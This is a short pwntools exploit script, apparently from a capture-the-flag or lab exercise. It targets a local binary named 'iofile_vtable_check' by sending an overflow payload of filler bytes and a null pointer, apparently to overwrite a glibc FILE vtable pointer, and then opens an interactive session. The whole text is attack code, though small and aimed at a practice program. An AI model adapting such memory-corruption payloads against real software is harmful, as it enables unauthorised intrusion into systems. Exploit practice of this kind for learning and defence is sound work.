from pwn import *
p = process('iofile_vtable_check')
raw_input('debug: ' + str(p.pid))
p.recvrepeat(1)
p.sendline('a'*0xd8 + 'A'*8 + p64(0))
p.interactive()
